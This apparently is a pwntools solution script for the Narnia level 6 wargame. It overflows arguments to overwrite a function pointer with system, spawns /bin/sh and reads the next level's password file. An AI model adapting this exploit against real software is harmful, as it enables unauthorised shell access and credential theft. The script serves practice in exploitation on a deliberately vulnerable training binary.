from pwn import *

systemAddress = 0xf7e4c850 # break in gdb and run `p system`
b1 = b'A'*8 + p32(systemAddress) # b1 will overwrite the fp function address from puts to system
b2 = b'A'*8 + b'/bin/sh' # b2 will overwrite b1 with /bin/sh, which system will run

p = process([b'/narnia/narnia6', b1, b2])

p.sendline(b'cat /etc/narnia_pass/narnia7')
print('\nnarnia7 pass: ' + p.recvline().decode())

p.close()